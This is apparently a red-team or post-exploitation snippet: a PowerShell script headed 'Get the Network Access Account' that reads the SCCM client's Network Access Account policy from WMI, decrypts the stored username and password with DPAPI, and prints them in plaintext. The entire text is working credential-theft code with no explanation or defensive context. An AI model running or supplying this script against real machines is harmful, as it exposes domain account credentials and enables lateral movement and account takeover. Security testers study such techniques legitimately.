## Get the Network Access Account

$SCCMSecret = (Get-CimInstance -ClassName ccm_networkaccessaccount -Namespace root\ccm\policy\machine\actualconfig)
foreach ($secret in $SCCMSecret) {
    $encodedstring = $secret.NetworkAccessUserName.split('[')[2].split(']')[0]
    $ByteArrayLength = $EncodedString.Length / 2 - 4
    $array = New-Object Byte[] ($EncodedString.Length / 2)
    [System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null
    for ($i = 0; $i -lt ($EncodedString.Length / 2 - 4); $i++) {
        $array[$i] = [System.Convert]::ToByte(($EncodedString.Substring(($i + 4) * 2, 2)), 16)}
    $Decryptedvalue = [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($array, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
    Write-Host("Decrypted NetworkAccess Account Username = $Decryptedvalue")
    $encodedstring = $secret.NetworkAccessPassword.split('[')[2].split(']')[0]
    $ByteArrayLength = $EncodedString.Length / 2 - 4
    $array = New-Object Byte[] ($EncodedString.Length / 2)
    [System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null
    for ($i = 0; $i -lt ($EncodedString.Length / 2 - 4); $i++) {
        $array[$i] = [System.Convert]::ToByte(($EncodedString.Substring(($i + 4) * 2, 2)), 16)}
    $Decryptedvalue = [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($array, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
    Write-Host("Decrypted NetworkAccess Account Password = $Decryptedvalue")}